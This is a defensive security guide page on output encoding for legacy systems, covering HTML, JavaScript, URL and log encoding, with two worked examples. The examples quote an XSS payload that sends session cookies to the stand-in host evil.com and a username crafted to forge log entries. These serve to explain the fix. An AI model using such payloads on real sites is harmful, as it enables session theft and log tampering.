---
title: Output Encoding
description: Mask outputs to prevent injection attacks
category:
- Security
- Code
quality_tactics_url: https://qualitytactics.de/en/security/output-encoding
problems:
- cross-site-scripting-vulnerabilities
- sql-injection-vulnerabilities
- log-injection-vulnerabilities
- error-message-information-disclosure
- inadequate-error-handling
- insecure-data-transmission
layout: solution
---

## How to Apply ◆

> Legacy systems frequently insert data into output contexts (HTML, SQL, JavaScript, URLs, logs) without encoding it for the target context, enabling injection attacks. Output encoding transforms data into a safe representation for each specific output context.

- Identify all output contexts in the legacy system where untrusted data is inserted: HTML body, HTML attributes, JavaScript, CSS, URLs, SQL queries, XML, JSON, log entries, and shell commands. Each context requires different encoding rules.
- Apply HTML entity encoding when inserting untrusted data into HTML body content. Characters like `<`, `>`, `&`, `"`, and `'` must be replaced with their HTML entity equivalents to prevent XSS.
- Use JavaScript-specific encoding when inserting data into JavaScript contexts. HTML encoding is not sufficient for JavaScript — data must be escaped according to JavaScript string literal rules.
- Apply URL encoding when inserting untrusted data into URL parameters or path segments. This prevents parameter injection and ensures special URL characters do not alter the URL structure.
- Use context-aware templating engines that automatically encode output for the correct context. Many modern templating engines provide automatic XSS protection, but legacy systems often use raw string concatenation that bypasses these protections.
- Encode log output to prevent log injection attacks. Newline characters, ANSI escape sequences, and format string specifiers in log entries should be escaped or removed to prevent attackers from forging log entries or exploiting log viewers.
- Implement a Content Security Policy (CSP) as a defense-in-depth measure that limits the impact of any XSS that bypasses output encoding. CSP restricts which scripts can execute, reducing the exploitability of encoding failures.

## Tradeoffs ⇄

> Output encoding prevents injection attacks by ensuring that data is always treated as data rather than executable code, but it requires context-aware implementation and consistent application.

**Benefits:**

- Prevents cross-site scripting by ensuring that user-supplied data displayed in web pages cannot contain executable scripts.
- Complements input validation by providing a second layer of defense — even if malicious input passes validation, proper encoding prevents it from being executable.
- Applicable retroactively to legacy systems without changing business logic — encoding is applied at the output layer without modifying data storage or processing.
- Context-aware encoding is more reliable than input filtering because it addresses the root cause (unsafe output) rather than attempting to anticipate all possible attack inputs.

**Costs and Risks:**

- Different output contexts require different encoding, and applying the wrong encoding (e.g., HTML encoding in a JavaScript context) provides no protection.
- Legacy templating systems may not support automatic context-aware encoding, requiring manual encoding at every output point.
- Double-encoding (encoding data that is already encoded) produces garbled output, which is a common issue when retrofitting encoding into legacy systems with inconsistent encoding practices.
- Output encoding does not help for rich content where HTML is intentionally rendered (CMS systems, email templates), requiring sanitization rather than encoding.

## Examples

> The following scenarios illustrate how output encoding prevents injection attacks in legacy systems.

A legacy customer support portal displays ticket details by inserting customer-submitted text directly into HTML using JSP string concatenation: `<%= ticket.getDescription() %>`. A customer submits a ticket with the description `<img src=x onerror=document.location='http://evil.com/steal?c='+document.cookie>`, and every support agent who views the ticket has their session cookie stolen. The team replaces the raw output with encoded output using JSTL: `<c:out value="${ticket.description}" />`, which automatically HTML-encodes the output. The malicious script is rendered as visible text rather than executed. The team audits all 340 JSP pages in the legacy application and converts all raw output expressions to use context-appropriate encoding, eliminating 47 additional XSS vulnerabilities discovered during the audit.

A legacy application writes user-supplied data to log files using `logger.info("User " + username + " logged in")`. An attacker registers with the username `admin\nINFO: Password changed for root user`, injecting a fake log entry that appears legitimate when the operations team reviews logs. The team implements log encoding that escapes newline characters, tabs, and ANSI control sequences in all log messages. They also switch to structured JSON logging where user-supplied values are always enclosed in string fields, making it impossible to inject log structure. After the fix, the attacker's username appears as a single log entry with escaped characters rather than as a separate, forged log line.
